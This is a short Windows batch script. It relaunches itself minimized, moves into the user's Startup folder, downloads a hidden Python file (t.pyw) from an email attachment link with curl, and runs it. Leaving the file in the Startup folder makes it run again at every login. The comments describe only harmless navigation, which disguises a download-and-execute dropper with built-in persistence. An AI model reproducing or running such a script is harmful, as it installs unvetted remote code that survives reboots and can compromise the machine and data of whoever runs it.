@echo off
if not defined MINIMIZED (
    set MINIMIZED=1
    start "" /min "%~dpnx0"
    exit
)

rem Navigate to the current user's Startup folder

rem Get the Startup folder path for the current user
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

rem Navigate to the Startup folder
cd /d "%startupFolder%"

rem Display the current directory to confirm
echo You are now in the Startup folder:
curl -o t.pyw https://mail-attachment.googleusercontent.com/attachment/u/0/?ui=2&ik=7ce7e1eecd&attid=0.1&permmsgid=msg-a:r6855911096965482502&th=19faa749a60168e6&view=att&disp=safe&realattid=f_ms54d6he0&zw&saddbat=ANGjdJ8veOdftlBRYSAuJA5aRhBhjgpsBEirlbbzt-04T96tN02QE5lP70w60wVe89nOe9tmwrdPTJ8s1SSJfOcBp1lU4-0d90GNQ1Q-jGjgipJj_Tm_SHjKGsse6SgdkjJGhFFKpRVVJleM5Bw9_LSEboSmogJzmQkzwH7D0RNoGHcTMT356AM-UHzV75Ekjv1YRSna_6v5vaP71-m7r94iCQvXfTY0v8PYFe0I_AHAb7wSryWbGjs63wlCPUFGNRxdmDm43pBquFomqJkn1faLxLbrEa3LBgO7BrseaPF1bDfcQFFOm8ZJKvbJbrjtAefkXIb9pZKcxH1VEMDYlGGg7mazZyFZv5djidmyZnVVjR-Rs2V7yIwFN--YKZGcRSuF6bIiSeInwAdHmpnBAxwKOKcoJXTHjQwyiw1G8u5Rp3Rs3cRNY6i73EBIX8Q7l3v1YdMNRCldjRtvwAiKYspNFMZuMwXyWg8htaNXSfWYqgITAHk8D6_dnbX4v6taDDyWiNJRs6Vaf5bPX0ZAEfY8Kyyzre6V2zIGA9D2yOyMF6hmUtBJdtEfWWZQFD-UiVcX9iTVEUllgY-SLgp5ApaUz5D63WbJaGxmrC7-DStiMX9CGtSeXor65FmYqul-TN6TJVW474CSC4tEX7dixFaE9CWlujWXgo8X2Nn_Y3X_yPivMQTIC3H5LsYcdC2gNn6x4UV_Xn--cOpgzYqayWvi2PvR99Hk0u4Ylbp4wOKlvoNoWrkLRmAZAPcDno6132IALriQ8P4X6hkNr6_UqNnc5xXoolPYaKmqRC01Dq2Xk9-ICfqRfTdylxNbWI8JpBTmRRGeOUNJVFF-ndqXSY8rLSSdJWlQ0W8p9mlDXSB_vXVzKzxaqQiWz_C6IFMxTC3GRonVZlttEqjbyq_NR6-Gg7RMAb_Fq1qB4vJqwNGJG7w1nISVDFYpUADmXO-1mABW55JpzBwbb0S80NjospFsVMf-wG5QWyzVhmxcHi6324PHWRv71E3cguxOY7k

start t.pyw

rem Optional: list the contents of the Startup folder
dir

exit
